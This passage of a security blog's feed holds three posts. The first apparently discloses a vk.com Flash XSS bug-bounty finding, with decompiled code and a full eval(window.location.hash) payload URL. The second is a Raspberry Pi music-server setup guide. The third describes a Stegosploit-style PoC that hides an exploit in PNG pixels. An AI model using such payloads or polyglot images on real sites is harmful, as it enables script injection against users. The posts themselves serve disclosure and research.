            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;mouseOut&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;e&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;some_mouse_over_condition&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;mouseOver&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;mouseOver&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nx"&gt;void&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;ExternalCall&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;Simple&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;config&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;onMouseOver&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;stage&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;Event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;MOUSE_LEAVE&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nx"&gt;mouseOut&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;insideFrame&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;true&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="kd"&gt;package&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="c1"&gt;// some imports&lt;/span&gt;

    &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;class&lt;/span&gt; &lt;span class="nx"&gt;Config&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

        &lt;span class="kd"&gt;private&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;_config&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="c1"&gt;// ... some params ...&lt;/span&gt;
            &lt;span class="nx"&gt;onMouseOver&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;debugLog&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
            &lt;span class="c1"&gt;// ... some more params ...&lt;/span&gt;
        &lt;span class="p"&gt;};&lt;/span&gt;

        &lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kd"&gt;static&lt;/span&gt; &lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;loadConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;LoaderInfo&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Object&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;urlQuery&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;urlVars&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;loaderInfo&lt;/span&gt;&lt;span class="o"&gt;:*&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;_arg1&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
            &lt;span class="k"&gt;try&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="nx"&gt;loaderInfo&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;LoaderInfo&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;loaderInfo&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
                &lt;span class="nx"&gt;parameters&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;loaderInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;
                &lt;span class="nx"&gt;urlQuery&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;loaderInfo&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;url&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;?&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
                &lt;span class="nx"&gt;urlVars&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nx"&gt;URLVariables&lt;/span&gt;&lt;span class="p"&gt;(((&lt;/span&gt;&lt;span class="nx"&gt;urlQuery&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;||&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)));&lt;/span&gt;
                &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt; &lt;span class="k"&gt;in&lt;/span&gt; &lt;span class="nx"&gt;urlVars&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;]){&lt;/span&gt;
                        &lt;span class="nx"&gt;delete&lt;/span&gt; &lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;key&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
                    &lt;span class="p"&gt;};&lt;/span&gt;
                &lt;span class="p"&gt;};&lt;/span&gt;
                &lt;span class="nx"&gt;setConfig&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;parameters&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;catch&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;&lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;_config&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
        &lt;span class="p"&gt;}&lt;/span&gt;

    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;

&lt;p&gt;The cleansing of parameters object was being done in the method &lt;strong&gt;loadConfig&lt;/strong&gt;. So, any parameter provided in the url is removed from the parameters object.
This looked to me like a protection against flash xss because in a legitimate embed scenario parameters are provided through the &lt;strong&gt;param&lt;/strong&gt; html tag. Ideally,
this is a really good way but they forgot something. Have a look at &lt;strong&gt;line 66&lt;/strong&gt;. They are extracting url parameters by &lt;code&gt;loaderInfo.url.split("?")[1]&lt;/code&gt;. What
if the url is something like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;http://vk.com/swf/photo_uploader_lite.swf?h=h?&amp;amp;param1=value1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As far as flash player is concerned the parameters object will have the following values&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;h = h?
param1 = value1
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;But the url parameters extracted by swf will have the following values (as they are considering only 1 index element after splitting)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;h = h
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;So, when they try to remove url parameters from the flash parameters object, only &lt;code&gt;h&lt;/code&gt; gets removed but not &lt;code&gt;param1&lt;/code&gt;. So, we successfully got our
url parameter to stay intact in the parameters object. Cool. &lt;strong&gt;Line 39&lt;/strong&gt; has a call to &lt;code&gt;ExternalCall.Simple&lt;/code&gt; with argument &lt;code&gt;config[onMouseOver]&lt;/code&gt;. Now
ideally if you put anything like &lt;code&gt;alert(1)&lt;/code&gt;, &lt;code&gt;confirm(1)&lt;/code&gt; etc.. it will work. For me a bug is something which can be exploitable. Our next challenge
lies at &lt;strong&gt;line 12&lt;/strong&gt;. The only allowed characters in your javascript call are &lt;code&gt;a-z&lt;/code&gt;,&lt;code&gt;0-9&lt;/code&gt;,&lt;code&gt;(&lt;/code&gt;,&lt;code&gt;)&lt;/code&gt;,&lt;code&gt;.&lt;/code&gt;,&lt;code&gt;_&lt;/code&gt;. Javascript strings are common part of any
useful payload, but quotes are filtered here. &lt;code&gt;,&lt;/code&gt; is not allowed which prevents usage of &lt;code&gt;String.fromCharCode&lt;/code&gt;. &lt;code&gt;window.location.hash&lt;/code&gt; came to my mind. So,
a working payload will be&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nb"&gt;eval&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;substr&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Now you can place any js code in the fragment part of the url. All this is awesome, but the file is not played by the browser as of now because of the content
type. In this desperate time, my old friend &lt;strong&gt;IE&lt;/strong&gt; came to my rescue. If you carefully observe the response headers there is no &lt;code&gt;X-Content-Type-Options&lt;/code&gt;.
So, when I opened the url in IE, KABOOOOM!!! It sniffed the content type and played the flash file. Ah, the bug is finally exploitable but only in &lt;strong&gt;IE&lt;/strong&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="nt"&gt;http&lt;/span&gt;&lt;span class="o"&gt;://&lt;/span&gt;&lt;span class="nt"&gt;vk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;com&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;swf&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="nt"&gt;photo_uploader_lite&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;swf&lt;/span&gt;&lt;span class="o"&gt;?&lt;/span&gt;&lt;span class="nt"&gt;h&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;h&lt;/span&gt;&lt;span class="o"&gt;?&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;onMouseOver&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;eval&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;window&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;location&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;hash&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;substr&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt;&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="nn"&gt;alert&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;domain&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;A different payload is in the image&lt;/p&gt;
&lt;p&gt;&lt;img alt="vk.com Flash XSS" src="https://i.imgur.com/wBhOE51.png?1"&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;HackerOne Report is present &lt;a href="https://hackerone.com/reports/66121"&gt;here&lt;/a&gt;&lt;/strong&gt; (Not public at the time of writing)&lt;/p&gt;</content><category term="info"></category></entry><entry><title>RPi 2 as my music server</title><link href="https://tunnelshade.in/blog/2015/08/raspberry-pi-as-music-server/" rel="alternate"></link><published>2015-08-19T00:00:00+05:30</published><updated>2015-08-19T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2015-08-19:/blog/2015/08/raspberry-pi-as-music-server/</id><summary type="html">&lt;p&gt;Almost everyone is familiar with what &lt;a href="https://www.raspberrypi.org"&gt;Raspberry Pi&lt;/a&gt; is, if you are not aware of it better stop reading! When Pi2 was
&lt;a href="https://www.raspberrypi.org/blog/raspberry-pi-2-on-sale/"&gt;released&lt;/a&gt; with some great upgrades I got one to just tinker with it. Couldn't do much with it until recently. I joined my first full time role at â€¦&lt;/p&gt;</summary><content type="html">&lt;p&gt;Almost everyone is familiar with what &lt;a href="https://www.raspberrypi.org"&gt;Raspberry Pi&lt;/a&gt; is, if you are not aware of it better stop reading! When Pi2 was
&lt;a href="https://www.raspberrypi.org/blog/raspberry-pi-2-on-sale/"&gt;released&lt;/a&gt; with some great upgrades I got one to just tinker with it. Couldn't do much with it until recently. I joined my first full time role at a
company, so I spend approx. 6 hours of a weekday at office.&lt;/p&gt;
&lt;p&gt;I have my work laptop and then my personal MBPR, syncing music between these is a pain. Sometimes I just want to lay back and browse through my music
collection(AFK time). I have a 2.1 speaker set which I usually connect to my laptop when I wish to listen to some music (All the time!)&lt;/p&gt;
&lt;h3&gt;Things I have&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;2.1 Speaker System&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Raspberry Pi 2&lt;/strong&gt;&lt;/li&gt;
&lt;li&gt;Home WiFi Network&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Solution&lt;/h3&gt;
&lt;p&gt;&lt;a href="http://www.musicpd.org/"&gt;&lt;strong&gt;MPD&lt;/strong&gt;&lt;/a&gt; or Music Player Daemon is a best fit solution for my problem. All my music will be on some kind of memory storage accessible to pi2. If I run
mpd on the pi2 connect my speakers to it and I can just connect to it using &lt;a href="http://ncmpcpp.rybczak.net/"&gt;&lt;strong&gt;NCMPCPP&lt;/strong&gt;&lt;/a&gt; on my laptops while in my home network. If I am at office,
I can still stream my music collection to my office laptop over a vpn. One good side effect is that there are good mpd client android applications like &lt;a href="https://play.google.com/store/apps/details?id=com.namelessdev.mpdroid&amp;amp;hl=en"&gt;&lt;strong&gt;MPDroid&lt;/strong&gt;&lt;/a&gt;. This way, I have
only one place to keep my songs and I can enjoy them everywhere.&lt;/p&gt;
&lt;p&gt;The following is a reminder for me as getting MPD to run on Pi2 is not so straightforward. I use a &lt;a href="https://www.offensive-security.com/kali-linux-vmware-arm-image-download/"&gt;Kali Linux 2.0 image&lt;/a&gt; on Pi.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure you connect your Pi in your home network with a static IP. This will allow you to save settings in your mpd clients.&lt;/li&gt;
&lt;li&gt;I use Kali as a non-root user, so create an account for it.&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Sound is disabled by default on Pi2. Install &lt;code&gt;alsa-utils&lt;/code&gt; if not present and load &lt;code&gt;snd_bmc2835&lt;/code&gt; module.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# apt-get install alsa-utils&lt;/span&gt;
&lt;span class="c1"&gt;# modprobe snd_bcm2835&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;To load this module everytime at boot, just add it to &lt;code&gt;/etc/modules&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# echo &amp;quot;snd_bcm2835&amp;quot; &amp;gt;&amp;gt; /etc/modules&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;I want to run MPD under the non-root user, so this user has to be added to the &lt;code&gt;audio&lt;/code&gt; group if not already present.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# grep &amp;quot;audio&amp;quot; /etc/groups&lt;/span&gt;
&lt;span class="c1"&gt;# usermod -a -G group user&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Now, hack up the configuration of mpd. Default is present at &lt;code&gt;/etc/mpd.conf&lt;/code&gt;. I prefer using it from my home directory, so copied it and edited it.
All the sections of self explainatory and I am pasting here a minified version. Make sure you create all the files and folder mentioned here and ensure
that MPD has access to write to these locations and your music directory&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;music_directory     &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music&amp;quot;&lt;/span&gt;
playlist_directory      &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/playlists&amp;quot;&lt;/span&gt;
db_file         &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/mpd/tag_cache&amp;quot;&lt;/span&gt;
log_file            &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/mpd/mpd.log&amp;quot;&lt;/span&gt;
pid_file            &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/mpd/pid&amp;quot;&lt;/span&gt;
state_file          &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/mpd/state&amp;quot;&lt;/span&gt;
sticker_file                   &lt;span class="s2"&gt;&amp;quot;/home/tunnelshade/Music/mpd/sticker.sql&amp;quot;&lt;/span&gt;
user                &lt;span class="s2"&gt;&amp;quot;tunnelshade&amp;quot;&lt;/span&gt;

bind_to_address     &lt;span class="s2"&gt;&amp;quot;0.0.0.0&amp;quot;&lt;/span&gt;

port                &lt;span class="s2"&gt;&amp;quot;7000&amp;quot;&lt;/span&gt;

password                        &lt;span class="s2"&gt;&amp;quot;password@read,add,control,admin&amp;quot;&lt;/span&gt;

input &lt;span class="o"&gt;{&lt;/span&gt;
    plugin &lt;span class="s2"&gt;&amp;quot;curl&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

audio_output &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;type&lt;/span&gt;        &lt;span class="s2"&gt;&amp;quot;alsa&amp;quot;&lt;/span&gt;
    name        &lt;span class="s2"&gt;&amp;quot;My ALSA Device&amp;quot;&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

filesystem_charset      &lt;span class="s2"&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;
id3v1_encoding          &lt;span class="s2"&gt;&amp;quot;UTF-8&amp;quot;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;And lastly, have to start MPD at every boot. If we add a service then it will start with system privilege, but there is one alternative. Add it as
a user cron after start. So, for me the cron entry will look like (&lt;code&gt;crontab -e&lt;/code&gt;)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;@reboot mpd ~/.mpdconf
&lt;/pre&gt;&lt;/div&gt;


&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Just reboot and connect from your favourite devices.&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Screenshots&lt;/h3&gt;
&lt;iframe src="https://drive.google.com/embeddedfolderview?id=0B7bSDtYJAnbPflZwbFBCYUl0eWlFOTYzLV93Y0hfaWdSeWZmcGEyN01LY1JsYmFRaUJxYzA#grid" width="100%" height="500px" frameborder="0"&gt;&lt;/iframe&gt;</content><category term="tools"></category></entry><entry><title>Stegosploit is simple fun!!</title><link href="https://tunnelshade.in/blog/2015/06/stegosploit-fun/" rel="alternate"></link><published>2015-06-08T00:00:00+05:30</published><updated>2015-06-08T00:00:00+05:30</updated><author><name>Bharadwaj Machiraju</name></author><id>tag:tunnelshade.in,2015-06-08:/blog/2015/06/stegosploit-fun/</id><summary type="html">&lt;p&gt;If you are not familiar with the word &lt;strong&gt;STEGOSPLOIT&lt;/strong&gt; then you must definitely look at the
following links&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://conference.hitb.org/hitbsecconf2015ams/sessions/stegosploit-hacking-with-pictures/"&gt;The actual talk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Followed by huge popularity. Just google the word!&lt;/li&gt;
&lt;li&gt;Then &lt;a href="https://medium.com/@christianbundy/why-stegosploit-isn-t-an-exploit-189b0b5261eb"&gt;criticism&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Then, I stopped following the topic at this stage.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Slides of the talk are available &lt;a href="https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T1-Saumil-Shah-Stegosploit-Hacking-with-Pictures.pdf"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;My Thoughts&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Would â€¦&lt;/li&gt;&lt;/ul&gt;</summary><content type="html">&lt;p&gt;If you are not familiar with the word &lt;strong&gt;STEGOSPLOIT&lt;/strong&gt; then you must definitely look at the
following links&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://conference.hitb.org/hitbsecconf2015ams/sessions/stegosploit-hacking-with-pictures/"&gt;The actual talk&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Followed by huge popularity. Just google the word!&lt;/li&gt;
&lt;li&gt;Then &lt;a href="https://medium.com/@christianbundy/why-stegosploit-isn-t-an-exploit-189b0b5261eb"&gt;criticism&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;Then, I stopped following the topic at this stage.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Slides of the talk are available &lt;a href="https://conference.hitb.org/hitbsecconf2015ams/wp-content/uploads/2015/02/D1T1-Saumil-Shah-Stegosploit-Hacking-with-Pictures.pdf"&gt;here&lt;/a&gt;&lt;/p&gt;
&lt;h4&gt;My Thoughts&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Would love to have a tool that supports all image types. Other than that, embedding html in image metadata is common.&lt;/li&gt;
&lt;li&gt;Non tech people who didn't think of what is happening in the background started giving out blunt statements like &lt;em&gt;PICTURES ARE NO MORE SAFE&lt;/em&gt;. And
every other noob went crazy.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;What counts?&lt;/h4&gt;
&lt;p&gt;The mention of &lt;em&gt;lcamtuf&lt;/em&gt; in the slides made me google his &lt;strong&gt;JPG+HTML&lt;/strong&gt; &lt;a href="http://lcamtuf.coredump.cx/squirrel/"&gt;polyglot&lt;/a&gt;. After going through the slides
of Mr.Shah, I decided to write a simple PoC with the exact steps taken from his slides. So, my innocent plan was to&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Hide an exploit payload in the image pixels.&lt;/li&gt;
&lt;li&gt;Create a &lt;strong&gt;HTML+PNG&lt;/strong&gt; polyglot so the image itself can be used as a loader.&lt;/li&gt;
&lt;li&gt;Then use &lt;strong&gt;HTML5&lt;/strong&gt; canvas to reconstruct the actual payload in the browser.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For anyone who read those slides all this would seem normal &amp;amp; yes it is!!&lt;/p&gt;
&lt;h4&gt;Script&lt;/h4&gt;
&lt;p&gt;{% gist tunnelshade/757de16b6ac6f5f337fd %}&lt;/p&gt;
&lt;h4&gt;How it works??&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;First it takes the payload file and converts the content into a bit string.&lt;/li&gt;
&lt;li&gt;This bit string is hidden inside &lt;strong&gt;LSB&lt;/strong&gt; bit of R, G &amp;amp; B pixel values of the input PNG file. This is done using &lt;a href="https://pypi.python.org/pypi/Pillow/2.8.2"&gt;Pillow&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Then the HTML requried to decode this payload is added to the same PNG file to create a HTML+PNG polyglot.&lt;/li&gt;
&lt;li&gt;For the final PNG to deliver the payload, it should be served with content type &lt;strong&gt;text/html&lt;/strong&gt;.&lt;/li&gt;
&lt;li&gt;Then when image is loaded, the browser execute the HTML in it leading to reconstruction and running of exploit.&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;Selling points&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Common users are aware of malicious websites but not malicious images yet ;)&lt;/li&gt;
&lt;li&gt;As an end user, what difference do you see?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Innocent cat" src="https://i.imgur.com/PCktIck.jpg"&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Look again :P&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="Innocent cat becomes evil" src="https://i.imgur.com/TcjV8yu.jpg"&gt;&lt;/p&gt;
&lt;h4&gt;Difficulties&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;Who servers images with html content type? Unless you want to pwn users!&lt;/li&gt;
&lt;li&gt;ML trained detectors can catch these images, but you can always improvise ;)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;PS: The script only works on some PNGs for now&lt;/strong&gt;&lt;/p&gt;
&lt;h4&gt;Sample Console Output&lt;/h4&gt;
